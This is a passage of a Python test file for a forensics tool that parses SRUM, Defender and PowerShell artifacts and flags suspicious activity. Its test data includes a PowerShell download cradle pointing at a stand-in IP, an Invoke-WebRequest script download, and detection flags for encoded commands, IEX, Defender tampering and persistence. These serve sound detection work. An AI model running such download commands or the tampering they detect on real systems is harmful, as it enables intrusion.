        "SourceFile": "C:\\Windows\\System32\\sru\\SRUDB.dat",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "srum", "name": "SRUDB.dat", "source_path": row["SourceFile"], "parser": "srum_db"})
    assert (doc.get("host") or {}).get("name") is None


def test_artifact_classification_srudb_dat() -> None:
    result = classify_artifact(Path("SRUDB.dat"))
    assert result["artifact_type"] == "srum"
    assert result["parser"] == "srum_db"


def test_srum_parse_report_and_sample_from_events() -> None:
    events = [
        {
            "id": "s1",
            "artifact": {"type": "srum", "parser": "srum_jsonl"},
            "event": {"type": "network_usage"},
            "srum": {"table": "Network Usage", "app_name": "powershell.exe", "user_sid": "S-1", "network_profile": "HomeWiFi", "interface_guid": "{1}", "bytes_sent": 50000000, "bytes_received": 100000},
            "network": {"direction": "bidirectional", "bytes_sent": 50000000, "bytes_received": 100000, "bytes_total": 50100000},
            "process": {"name": "powershell.exe"},
            "tags": ["scripting_process", "high_upload", "upload_heavy"],
            "suspicious_reasons": ["SRUM network activity by scripting process", "SRUM high outbound bytes", "SRUM upload-heavy traffic"],
            "data_quality": ["missing_host"],
        },
        {
            "id": "s2",
            "artifact": {"type": "srum", "parser": "srum_jsonl"},
            "event": {"type": "network_connectivity_observed"},
            "srum": {"table": "Network Connectivity", "app_name": "chrome.exe", "user_sid": "S-1", "network_profile": "HomeWiFi", "interface_guid": "{1}"},
            "network": {"direction": "unknown"},
            "process": {"name": "chrome.exe"},
            "tags": [],
            "suspicious_reasons": [],
            "data_quality": ["missing_host"],
        },
    ]
    parser_audit = [{"artifact_type": "srum", "parser_name": "srum_jsonl", "records_read": 2, "records_parsed": 2, "events_indexed": 2}]
    report = _build_srum_parse_report(parser_audit, [], events, selected_artifact_types=["srum"], scope="evidence")
    sample = _build_srum_sample_events(events)
    assert report["records_indexed"] == 2
    assert sum(report["by_event_type"].values()) >= 2
    assert report["network_usage_count"] == 1
    assert report["connectivity_count"] == 1
    assert report["high_outbound_count"] == 1
    assert report["total_bytes_sent"] == 50000000
    assert sample


def test_srum_semi_auto_sections_and_correlation(monkeypatch) -> None:
    srum_path = Path(__file__).parent / "fixtures" / "srum_network_usage_sample.csv"
    browser_path = Path(__file__).parent / "fixtures" / "browser_downloads_sample.csv"
    srum_docs = normalize_file("case-1", "ev-1", "art-srum", srum_path, {"artifact_type": "srum", "name": srum_path.name, "source_path": str(srum_path), "parser": "zimmerman"})
    browser_docs = normalize_file("case-1", "ev-1", "art-browser", browser_path, {"artifact_type": "browser", "name": browser_path.name, "source_path": str(browser_path), "parser": "browserhistoryview"})
    evtx_event = {
        "id": "evtx-1",
        "event_id": "evtx-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-evtx",
        "@timestamp": "2026-05-03T10:20:00+00:00",
        "event": {"category": "execution", "type": "program_execution", "severity": "medium", "message": "Process created: AnyDesk.exe"},
        "process": {"name": "AnyDesk.exe", "path": "C:\\Program Files\\AnyDesk\\AnyDesk.exe", "command_line": "AnyDesk.exe"},
        "artifact": {"type": "evtx", "name": "Security-EvtxECmd.csv"},
        "tags": [],
        "suspicious_reasons": [],
    }
    events = [*browser_docs, *srum_docs, evtx_event]
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter(events))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["network_activity"]
    assert result["sections"]["high_upload_activity"]
    assert result["sections"]["remote_access_activity"]
    assert result["sections"]["possible_exfiltration"]
    assert result["sections"]["downloaded_files"]
    assert any(item["confidence"] >= 0.8 for item in result["sections"]["remote_access_activity"])


def test_artifact_classification_defender_csv() -> None:
    result = classify_artifact(Path("WindowsDefender_DetectionHistory.csv"), headers=["ThreatName", "DetectionTime", "Resource", "Action", "Severity"])
    assert result["artifact_type"] == "defender"
    assert result["profile"] == "detection"


def test_artifact_classification_defender_detection_history_name_with_underscore() -> None:
    result = classify_artifact(Path("detection_history_sample.txt"), headers=[])
    assert result["artifact_type"] == "defender"
    assert result["parser"] == "defender_detection_history"


def test_list_generic_artifacts_includes_defender_logs_and_detection_history(tmp_path: Path) -> None:
    detection_history = tmp_path / "detection_history_sample.txt"
    detection_history.write_text("ThreatName: Trojan:Win32/Test\nAction: Quarantine\n", encoding="utf-8")
    mplog = tmp_path / "MPLog-20260510.log"
    mplog.write_text("2026-05-10T08:21:00Z Threat: Trojan:Win32/Test | Action: Quarantine | Resource: file:_C:\\Users\\alex\\Downloads\\invoice.pdf.exe\n", encoding="utf-8")

    artifacts = list_generic_artifacts(tmp_path)
    by_name = {item["name"]: item for item in artifacts}

    assert by_name["detection_history_sample.txt"]["artifact_type"] == "defender"
    assert by_name["detection_history_sample.txt"]["parser"] == "defender_detection_history"
    assert by_name["MPLog-20260510.log"]["artifact_type"] == "defender"
    assert by_name["MPLog-20260510.log"]["parser"] == "defender_mplog"


def test_velociraptor_discovery_detects_defender_artifacts(tmp_path: Path) -> None:
    source_root = Path(__file__).parent / "fixtures" / "velociraptor_collection_defender"
    for source in source_root.rglob("*"):
        if source.is_dir():
            continue
        target = tmp_path / source.relative_to(source_root)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(source.read_bytes())
    discovery = discover_velociraptor_evidences(tmp_path)
    artifact_types = {candidate.artifact_type for candidate in discovery.candidates if candidate.category == "defender"}
    assert "defender_detection_history" in artifact_types
    assert "defender_mplog" in artifact_types
    assert "defender_quarantine" in artifact_types
    detection_candidate = next(item for item in discovery.candidates if item.artifact_type == "defender_detection_history")
    assert detection_candidate.supported is True
    assert detection_candidate.normalized_windows_path and detection_candidate.normalized_windows_path.startswith("C:\\")


def test_velociraptor_discovery_marks_defender_evtx_as_handled_by_evtx(tmp_path: Path) -> None:
    evtx_dir = tmp_path / "uploads" / "auto" / "C%3A" / "ProgramData" / "Microsoft" / "Windows Defender" / "Support"
    evtx_dir.mkdir(parents=True)
    evtx_file = evtx_dir / "Windows Defender.evtx"
    evtx_file.write_text("placeholder", encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "defender_evtx")
    assert candidate.supported is False
    assert candidate.parser_status == "handled_by_evtx_parser"
    assert candidate.reason == "Defender EVTX found; handled by EVTX parser"


def test_velociraptor_discovery_reports_defender_directory_only_when_parseables_missing(tmp_path: Path) -> None:
    quarantine_dir = tmp_path / "uploads" / "auto" / "C%3A" / "ProgramData" / "Microsoft" / "Windows Defender" / "Quarantine" / "Entries"
    quarantine_dir.mkdir(parents=True)
    quarantine_file = quarantine_dir / "sample.bin"
    quarantine_file.write_text("placeholder", encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "defender_directory_only")
    assert candidate.parser_status == "detected_but_no_parseable_files"
    assert candidate.reason == "Quarantine found but raw parser not implemented"
    assert "Expected ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Service\\DetectionHistory was not found" in candidate.warnings
    assert "Expected ProgramData\\Microsoft\\Windows Defender\\Support\\MPLog*.log was not found" in candidate.warnings


def test_defender_detection_history_normalization_fixture() -> None:
    path = Path(__file__).parent / "fixtures" / "defender" / "detection_history_sample.txt"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-defender",
        path,
        {
            "artifact_type": "defender",
            "name": path.name,
            "source_path": str(path),
            "parser": "defender_raw",
            "defender_artifact_type": "defender_detection_history",
            "source_tool": "defender_detection_history",
            "source_format": "raw",
        },
    )
    doc = docs[0]
    assert doc["artifact"]["type"] == "detection"
    assert doc["event"]["type"] in {"malware_detected", "security_detection", "remediation"}
    assert doc["event"]["action"] == "threat_quarantined"
    assert doc["detection"]["threat_name"] == "Trojan:Win32/Test"
    assert doc["file"]["path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"
    assert doc["detection"]["container_file"] == "C:\\Users\\alex\\Downloads\\archive.zip"
    assert doc["file"]["hash_sha1"] == "1111111111111111111111111111111111111111"
    assert doc["@timestamp"] == "2026-05-10T08:00:00+00:00"
    assert doc["raw"]["ThreatName"] == "Trojan:Win32/Test"


def test_defender_mplog_parses_interesting_lines_only() -> None:
    path = Path(__file__).parent / "fixtures" / "defender" / "mplog_sample.log"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-defender",
        path,
        {
            "artifact_type": "defender",
            "name": path.name,
            "source_path": str(path),
            "parser": "defender_raw",
            "defender_artifact_type": "defender_mplog",
            "source_tool": "defender_mplog",
            "source_format": "log",
        },
    )
    assert len(docs) == 3
    failed = next(doc for doc in docs if doc["event"]["action"] == "remediation_failed")
    assert failed["detection"]["line_number"] == "4"
    assert failed["file"]["path"] == "C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1"


def test_defender_csv_normalization_and_suspicion() -> None:
    path = Path(__file__).parent / "fixtures" / "defender" / "defender_sample.csv"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-defender",
        path,
        {
            "artifact_type": "defender",
            "name": path.name,
            "source_path": str(path),
            "parser": "csv",
            "defender_artifact_type": "defender_csv",
            "source_tool": "defender_csv",
            "source_format": "csv",
        },
    )
    severe = next(doc for doc in docs if doc["detection"]["threat_id"] == "1337")
    pua = next(doc for doc in docs if doc["detection"]["threat_id"] == "7331")
    assert severe["risk_score"] >= 78
    assert "quarantined" in severe["tags"]
    assert "downloaded_file" in severe["tags"]
    assert "pua" in pua["tags"]
    assert pua["event"]["action"] == "threat_allowed"
    assert "Threat was allowed" in pua["suspicious_reasons"]


def test_defender_csv_comma_maps_to_detection() -> None:
    path = Path("/tmp/defender_comma.csv")
    path.write_text(
        "Timestamp,ThreatName,Severity,Action,Status,Path,User\n"
        "2026-05-15T10:00:00Z,Trojan:Win32/Test.A,High,Detected,Active,C:\\Users\\dfir\\Downloads\\payload.exe,dfir\n",
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-defender",
        path,
        {
            "artifact_type": "defender",
            "name": path.name,
            "source_path": str(path),
            "parser": "defender_csv",
            "defender_artifact_type": "defender_csv",
            "source_tool": "defender",
            "source_format": "csv",
        },
    )
    doc = docs[0]
    assert doc["artifact"]["type"] == "detection"
    assert doc["artifact"]["parser"] == "defender_csv"
    assert doc["detection"]["threat_name"] == "Trojan:Win32/Test.A"
    assert doc["file"]["path"] == "C:\\Users\\dfir\\Downloads\\payload.exe"
    assert doc["user"]["name"] == "dfir"
    assert doc["event"]["type"] == "malware_detected"
    assert doc["risk_score"] >= 80
    assert "Defender malware detected" in doc["suspicious_reasons"]
    assert doc["execution"]["is_execution_confirmed"] is False


def test_defender_semicolon_delimiter_parses_without_fatal_error(tmp_path: Path) -> None:
    path = tmp_path / "defender_semicolon.csv"
    path.write_text(
        "Timestamp;ThreatName;Severity;Action;Status;Path;User\n"
        "2026-05-15T10:00:00Z;Trojan:Win32/Test.A;High;Detected;Active;C:\\Users\\dfir\\Downloads\\payload.exe;dfir\n",
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-defender",
        path,
        {
            "artifact_type": "defender",
            "name": path.name,
            "source_path": str(path),
            "parser": "defender_csv",
            "defender_artifact_type": "defender_csv",
            "source_tool": "defender",
            "source_format": "csv",
        },
    )
    assert len(docs) == 1
    assert {"delimiter_autodetected", "delimiter_fallback_used"} & set(docs[0]["data_quality"])


def test_defender_evtx_1116_maps_to_detection_event() -> None:
    row = {
        "EventID": 1116,
        "Channel": "Microsoft-Windows-Windows Defender/Operational",
        "Provider": "Microsoft-Windows-Windows Defender",
        "TimeCreated": "2026-05-15T10:00:00Z",
        "ThreatName": "Trojan:Win32/Test.A",
        "Path": "C:\\Users\\dfir\\Downloads\\payload.exe",
    }
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {"artifact_type": "evtx", "name": "Microsoft-Windows-Windows Defender%4Operational.evtx", "source_path": "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Windows Defender%4Operational.evtx", "parser": "native_evtx"},
    )
    assert doc["artifact"]["type"] == "detection"
    assert doc["artifact"]["parser"] == "defender_evtx"
    assert doc["windows"]["event_id"] == 1116
    assert doc["event"]["type"] == "malware_detected"
    assert doc["risk_score"] >= 80
    assert doc["@timestamp"] == "2026-05-15T10:00:00+00:00"
    assert doc["timestamp_precision"] == "event_time"


def test_defender_evtx_scoped_document_uses_defender_artifact_type() -> None:
    source = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "EventID": 1116,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "Provider": "Microsoft-Windows-Windows Defender",
            "TimeCreated": "2026-05-15T10:00:00Z",
            "ThreatName": "Trojan:Win32/Test.A",
            "Severity": "High",
            "Action": "Quarantine",
            "Path": "C:\\Users\\dfir\\Downloads\\payload.exe",
            "ProcessName": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MpCmdRun.exe",
        },
        {"artifact_type": "evtx", "name": "Microsoft-Windows-Windows Defender%4Operational.evtx", "source_path": "Microsoft-Windows-Windows Defender%4Operational.evtx", "parser": "native_evtx"},
    )
    defender_doc = build_defender_document("source-doc-1", source)
    assert defender_doc is not None
    assert defender_doc["artifact"]["type"] == "defender"
    assert defender_doc["artifact"]["parser"] == "defender_evtx"
    assert defender_doc["event"]["type"] == "malware_detected"
    assert defender_doc["threat"]["name"] == "Trojan:Win32/Test.A"
    assert defender_doc["defender"]["action"] == "Quarantine"
    assert defender_doc["file"]["path"] == "C:\\Users\\dfir\\Downloads\\payload.exe"
    assert defender_doc["raw"]["winlog"]["event_data"]["ThreatName"] == "Trojan:Win32/Test.A"
    assert defender_doc["related"]["source_event_id"] == source["event_id"]
    assert "Trojan:Win32/Test.A" in defender_doc["search_text"]


def test_defender_evtx_scoped_document_handles_evtxecmd_spaced_event_data() -> None:
    source = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "EventID": 1116,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "Provider": "Microsoft-Windows-Windows Defender",
            "TimeCreated": "2026-05-15T10:00:00Z",
            "Threat Name": "VirTool:Win32/Kekeo.A!MTB",
            "Threat ID": "2147756241",
            "Severity Name": "Severe",
            "Category Name": "Tool",
            "Action Name": "Not Applicable",
            "Source Name": "Real-Time Protection",
            "Process Name": "C:\\Windows\\explorer.exe",
            "Detection User": "EXAMPLECORP\\usera",
            "Path": "file:_\\\\tsclient\\share\\Rubeus.exe",
            "Error Code": "0x00000000",
        },
        {"artifact_type": "evtx", "name": "Microsoft-Windows-Windows Defender%4Operational.evtx", "source_path": "Microsoft-Windows-Windows Defender%4Operational.evtx", "parser": "native_evtx"},
    )
    defender_doc = build_defender_document("source-doc-spaced", source)
    assert defender_doc is not None
    assert defender_doc["artifact"]["type"] == "defender"
    assert defender_doc["threat"]["name"] == "VirTool:Win32/Kekeo.A!MTB"
    assert defender_doc["threat"]["severity"] == "critical"
    assert defender_doc["defender"]["detection_source"] == "Real-Time Protection"
    assert defender_doc["defender"]["path"] == "\\\\tsclient\\share\\Rubeus.exe"
    assert defender_doc["file"]["name"] == "Rubeus.exe"
    assert defender_doc["process"]["name"] == "explorer.exe"
    assert defender_doc["user"]["name"] == "EXAMPLECORP\\usera"


def test_defender_evtx_scoped_document_normalizes_configuration_change() -> None:
    source = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "EventID": 5007,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "Provider": "Microsoft-Windows-Windows Defender",
            "TimeCreated": "2026-05-15T10:00:00Z",
            "Message": "Configuration has changed",
        },
        {"artifact_type": "evtx", "name": "Defender.evtx", "source_path": "Defender.evtx", "parser": "native_evtx"},
    )
    defender_doc = build_defender_document("source-doc-2", source)
    assert defender_doc is not None
    assert defender_doc["artifact"]["type"] == "defender"
    assert defender_doc["event"]["type"] == "configuration_change"
    assert defender_doc["defender"]["event_id"] == 5007
    assert "Defender configuration changed" in defender_doc["suspicious_reasons"]


def test_defender_evtx_5007_configuration_change() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "EventID": 5007,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "Provider": "Microsoft-Windows-Windows Defender",
            "TimeCreated": "2026-05-15T10:00:00Z",
            "Message": "Configuration has changed",
        },
        {"artifact_type": "evtx", "name": "Defender.evtx", "source_path": "Defender.evtx", "parser": "native_evtx"},
    )
    assert doc["event"]["type"] == "configuration_change"
    assert 20 <= doc["risk_score"] <= 50
    assert "Defender configuration changed" in doc["suspicious_reasons"]


def test_defender_evtx_5013_tamper_event() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "EventID": 5013,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "Provider": "Microsoft-Windows-Windows Defender",
            "TimeCreated": "2026-05-15T10:00:00Z",
            "Message": "Tamper protection blocked a change",
        },
        {"artifact_type": "evtx", "name": "Defender.evtx", "source_path": "Defender.evtx", "parser": "native_evtx"},
    )
    assert doc["event"]["type"] == "tamper_protection"
    assert doc["risk_score"] >= 50


def test_defender_pipe_utf16_parses_without_delimiter_error(tmp_path: Path) -> None:
    path = tmp_path / "defender_pipe_utf16.txt"
    path.write_text(
        "Timestamp|ThreatName|Severity|Action|Status|Path|User\n"
        "2026-05-15T10:00:00Z|Trojan:Win32/Test.A|High|Detected|Active|C:\\Users\\dfir\\Downloads\\payload.exe|dfir\n",
        encoding="utf-16",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-defender",
        path,
        {
            "artifact_type": "defender",
            "name": path.name,
            "source_path": str(path),
            "parser": "defender_csv",
            "defender_artifact_type": "defender_csv",
            "source_tool": "defender",
            "source_format": "txt",
        },
    )
    assert len(docs) == 1
    assert docs[0]["artifact"]["type"] == "detection"


def test_defender_unrelated_csv_not_classified_as_detection(tmp_path: Path) -> None:
    path = tmp_path / "generic.csv"
    path.write_text("Name,Value\nfoo,bar\n", encoding="utf-8")
    result = classify_artifact(path, ["Name", "Value"])
    assert result["artifact_type"] != "defender"


def test_defender_sample_report_and_download_path_reason() -> None:
    event = {
        "artifact": {"type": "detection", "parser": "defender_csv"},
        "event": {"type": "malware_detected", "category": "detection", "severity": "high"},
        "detection": {"artifact_type": "defender_csv", "threat_name": "Trojan:Win32/Test.A", "severity": "high", "category": "Trojan", "action": "Detected", "status": "active", "remediation_action": None, "path": "C:\\Users\\dfir\\Downloads\\payload.exe"},
        "windows": {"event_id": 1116},
        "suspicious_reasons": ["Defender malware detected", "Defender detection in browser download path"],
        "data_quality": ["missing_host"],
    }
    report = _build_defender_parse_report(
        [
            {
                "artifact_type": "defender",
                "parser_name": "defender_csv",
                "source_file": "defender.csv",
                "records_read": 1,
                "records_parsed": 1,
                "records_indexed": 1,
                "by_threat_name": {"Trojan:Win32/Test.A": 1},
                "by_action": {"Detected": 1},
                "by_event_type": {"malware_detected": 1},
                "by_severity": {"high": 1},
                "by_category": {"Trojan": 1},
                "by_status": {"active": 1},
                "by_remediation_action": {},
                "suspicious_reason_counts": {"Defender malware detected": 1},
                "data_quality_counts": {"missing_host": 1},
            }
        ],
        [],
        [event],
        selected_artifact_types=["defender"],
        scope="evidence",
    )
    sample = _build_defender_sample_events([event])
    assert report["records_indexed"] == 1
    assert report["by_event_id"]["1116"] == 1
    assert sample


def test_defender_report_reconciles_indexed_events_from_real_events() -> None:
    parser_audit = [
        {
            "artifact_type": "defender",
            "parser_name": "defender_detection_history",
            "records_read": 1,
            "records_parsed": 1,
            "records_indexed": 1,
        },
        {
            "artifact_type": "defender",
            "parser_name": "defender_mplog",
            "records_read": 2,
            "records_parsed": 2,
            "records_indexed": 2,
        },
        {
            "artifact_type": "defender",
            "parser_name": "defender_csv",
            "records_read": 3,
            "records_parsed": 3,
            "records_indexed": 2,
        },
        {
            "artifact_type": "defender",
            "parser_name": "defender_evtx",
            "records_read": 3,
            "records_parsed": 3,
            "records_indexed": 3,
        },
    ]
    events = []
    for parser_name, event_type, event_id in [
        ("defender_detection_history", "remediation", None),
        ("defender_mplog", "remediation", None),
        ("defender_mplog", "remediation", None),
        ("defender_csv", "malware_detected", None),
        ("defender_csv", "malware_detected", None),
        ("defender_csv", "security_detection", None),
        ("defender_evtx", "malware_detected", 1116),
        ("defender_evtx", "remediation", 1117),
        ("defender_evtx", "configuration_change", 5007),
    ]:
        events.append(
            {
                "artifact": {"type": "detection", "parser": parser_name},
                "event": {"category": "detection", "type": event_type},
                "windows": {"event_id": event_id} if event_id is not None else {},
                "detection": {},
            }
        )
    report = _build_defender_parse_report(parser_audit, [], events, selected_artifact_types=["detection"], scope="evidence")
    assert report["parser_audit_records_indexed"] == 8
    assert report["indexed_events_count"] == 9
    assert report["records_indexed"] == 9
    assert "defender_report_count_reconciled_from_events" in report["warnings"]
    assert sum(report["by_parser"].values()) == 9
    assert report["by_event_id"]["1116"] == 1
    assert report["by_event_id"]["1117"] == 1
    assert report["by_event_id"]["5007"] == 1


def test_defender_report_no_reconciliation_when_counts_match() -> None:
    parser_audit = [
        {
            "artifact_type": "defender",
            "parser_name": "defender_csv",
            "records_read": 2,
            "records_parsed": 2,
            "records_indexed": 2,
        }
    ]
    events = [
        {"artifact": {"type": "detection", "parser": "defender_csv"}, "event": {"category": "detection", "type": "malware_detected"}, "detection": {}, "windows": {}},
        {"artifact": {"type": "detection", "parser": "defender_csv"}, "event": {"category": "detection", "type": "remediation"}, "detection": {}, "windows": {}},
    ]
    report = _build_defender_parse_report(parser_audit, [], events, selected_artifact_types=["detection"], scope="evidence")
    assert report["records_indexed"] == 2
    assert report["indexed_events_count"] == 2
    assert report["warnings"] == []


def test_defender_semi_auto_sections_and_correlation(monkeypatch) -> None:
    defender_path = Path(__file__).parent / "fixtures" / "defender" / "detection_history_sample.txt"
    browser_path = Path(__file__).parent / "fixtures" / "browser_downloads_sample.csv"
    defender_docs = normalize_file(
        "case-1",
        "ev-1",
        "art-defender",
        defender_path,
        {
            "artifact_type": "defender",
            "name": defender_path.name,
            "source_path": str(defender_path),
            "parser": "defender_raw",
            "defender_artifact_type": "defender_detection_history",
            "source_tool": "defender_detection_history",
            "source_format": "raw",
        },
    )
    browser_docs = normalize_file("case-1", "ev-1", "art-browser", browser_path, {"artifact_type": "browser", "name": browser_path.name, "source_path": str(browser_path), "parser": "browserhistoryview"})
    execution_event = {
        "id": "evtx-def-1",
        "event_id": "evtx-def-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-evtx",
        "@timestamp": "2026-05-10T08:10:00+00:00",
        "event": {"category": "execution", "type": "program_execution", "severity": "high", "message": "Process created: invoice.pdf.exe"},
        "process": {"name": "invoice.pdf.exe", "path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "command_line": "\"C:\\Users\\alex\\Downloads\\invoice.pdf.exe\""},
        "artifact": {"type": "evtx", "name": "Security-EvtxECmd.csv"},
        "tags": [],
        "suspicious_reasons": [],
    }
    task_event = {
        "id": "task-def-1",
        "event_id": "task-def-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-task",
        "@timestamp": "2026-05-10T08:05:00+00:00",
        "event": {"category": "persistence", "type": "scheduled_task_definition", "severity": "medium", "message": "Task observed"},
        "task": {"name": "Update", "path": "\\Update", "command": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "arguments": "", "enabled": True, "hidden": False},
        "artifact": {"type": "scheduled_task", "name": "task.xml"},
        "tags": ["scheduled_task", "persistence"],
        "suspicious_reasons": [],
    }
    events = [*browser_docs, *defender_docs, execution_event, task_event]
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter(events))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["defender_detections"]
    assert result["sections"]["detected_executions"]
    assert result["sections"]["quarantined_items"]


def test_artifact_classification_powershell_history() -> None:
    result = classify_artifact(Path("ConsoleHost_history.txt"), headers=["Command"])
    assert result["artifact_type"] == "powershell"
    assert result["profile"] == "powershell"
    assert result["parser"] == "powershell_history"


def test_velociraptor_discovery_detects_powershell_artifacts(tmp_path: Path) -> None:
    source_root = Path(__file__).parent / "fixtures" / "powershell" / "velociraptor_collection_powershell"
    for source in source_root.rglob("*"):
        if source.is_dir():
            continue
        target = tmp_path / source.relative_to(source_root)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(source.read_bytes())
    discovery = discover_velociraptor_evidences(tmp_path)
    ps_candidates = [candidate for candidate in discovery.candidates if candidate.category == "powershell"]
    artifact_types = {candidate.artifact_type for candidate in ps_candidates}
    assert "psreadline_history" in artifact_types
    assert "powershell_transcript" in artifact_types
    assert "powershell_script" in artifact_types
    history = next(item for item in ps_candidates if item.artifact_type == "psreadline_history")
    assert history.supported is True
    assert history.user == "alex"
    assert history.normalized_windows_path == "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"


def test_powershell_psreadline_normalization_fixture() -> None:
    path = Path(__file__).parent / "fixtures" / "powershell" / "ConsoleHost_history.txt"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-ps",
        path,
        {
            "artifact_type": "powershell",
            "name": path.name,
            "source_path": str(path),
            "parser": "powershell_history",
            "powershell_artifact_type": "psreadline_history",
            "source_tool": "native_powershell",
            "source_format": "txt",
        },
    )
    assert len(docs) >= 6
    iwr = next(doc for doc in docs if "Invoke-WebRequest" in (doc["powershell"]["command"] or ""))
    encoded = next(doc for doc in docs if doc["powershell"]["has_encoded_command"])
    iex = next(doc for doc in docs if doc["powershell"]["has_iex"])
    defender = next(doc for doc in docs if doc["powershell"]["has_defender_tampering"])
    persistence = next(doc for doc in docs if doc["powershell"]["has_persistence"])
    assert iwr["artifact"]["parser"] == "powershell_history"
    assert iwr["event"]["category"] == "execution"
    assert iwr["event"]["type"] == "powershell_history"
    assert iwr["powershell"]["urls"] == ["http://198.51.100.24/payload.exe"]
    assert iwr["url"]["domain"] == "198.51.100.24"
    assert iwr["download"]["url"] == "http://198.51.100.24/payload.exe"
    assert iwr["download"]["target_path"] == "C:\\Users\\alex\\Downloads\\payload.exe"
    assert iwr["download"]["file_name"] == "payload.exe"
    assert iwr["execution"]["is_execution_confirmed"] is False
    assert "download_cradle" in iwr["tags"]
    assert encoded["powershell"]["decoded_command_preview"] == "Get-Process"
    assert encoded["powershell"]["has_execution_policy_bypass"] is True
    assert "encoded_command" in encoded["tags"]
    assert encoded["execution"]["is_execution_confirmed"] is False
    assert "powershell_history_not_execution_proof" in encoded["data_quality"]
    assert iex["powershell"]["has_download"] is True
    assert "invoke_expression" in iex["tags"]
    assert defender["powershell"]["has_defender_tampering"] is True
    assert "defender_tampering" in defender["tags"]
    assert persistence["powershell"]["has_persistence"] is True
    assert persistence["raw"]["Command"] == persistence["powershell"]["command"]


def test_powershell_transcript_normalization_fixture() -> None:
    path = Path(__file__).parent / "fixtures" / "powershell" / "PowerShell_transcript_sample.txt"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-ps",
        path,
        {
            "artifact_type": "powershell",
            "name": path.name,
            "source_path": str(path),
            "parser": "powershell_transcript",
            "powershell_artifact_type": "powershell_transcript",
            "source_tool": "native_powershell",
            "source_format": "txt",
        },
    )
    whoami_doc = next(doc for doc in docs if doc["powershell"]["command"] == "whoami")
    iwr_doc = next(doc for doc in docs if "Invoke-WebRequest" in (doc["powershell"]["command"] or ""))
    assert whoami_doc["artifact"]["parser"] == "powershell_transcript"
    assert whoami_doc["event"]["type"] == "powershell_transcript"
    assert whoami_doc["powershell"]["username"] == "DESKTOP-K6F8D3D\\alex"
    assert whoami_doc["powershell"]["machine"] == "DESKTOP-K6F8D3D (Microsoft Windows NT 10.0.22631.0)"
    assert whoami_doc["powershell"]["host_application"] == "powershell.exe -NoP -ExecutionPolicy Bypass"
    assert whoami_doc["powershell"]["transcript_start_time"] == "2026-05-10T08:30:00+00:00"
    assert whoami_doc["@timestamp"] == "2026-05-10T08:31:00+00:00"
    assert whoami_doc["execution"]["is_execution_confirmed"] is True
    assert iwr_doc["powershell"]["has_download"] is True
    assert iwr_doc["download"]["url"] == "https://example.org/tool.ps1"
    assert iwr_doc["download"]["target_path"] == "C:\\Users\\alex\\Downloads\\tool.ps1"
    assert iwr_doc["download"]["file_name"] == "tool.ps1"
    assert iwr_doc["raw"]["Command"] == "Invoke-WebRequest https://example.org/tool.ps1 -OutFile C:\\Users\\alex\\Downloads\\tool.ps1"


def test_powershell_script_observed_fixture() -> None:
    path = Path(__file__).parent / "fixtures" / "powershell" / "suspicious_script.ps1"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-ps",
        path,
        {
            "artifact_type": "powershell",
            "name": path.name,
            "source_path": str(path),
            "parser": "powershell_script",
            "powershell_artifact_type": "powershell_script",
            "source_tool": "native_powershell",
            "source_format": "ps1",
        },
    )
    doc = docs[0]
    assert doc["artifact"]["parser"] == "powershell_script"
    assert doc["event"]["type"] == "powershell_script"
    assert doc["powershell"]["artifact_type"] == "powershell_script"
    assert doc["powershell"]["has_iex"] is True
    assert doc["powershell"]["has_download"] is True
    assert doc["powershell"]["has_defender_tampering"] is True
    assert doc["powershell"]["has_persistence"] is True
    assert doc["file"]["path"].endswith("suspicious_script.ps1")
    assert doc["event"]["action"] == "powershell_script_file_observed"
    assert doc["execution"]["is_execution_confirmed"] is False
    assert "powershell_script_file_not_execution_proof" in doc["data_quality"]


def test_powershell_jsonl_4104_confirms_execution_and_decodes_download() -> None:
    path = Path(__file__).parent / "fixtures" / "powershell" / "powershell_events_sample.jsonl"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-ps-jsonl",
        path,
        {
            "artifact_type": "powershell",
            "name": path.name,
            "source_path": str(path),
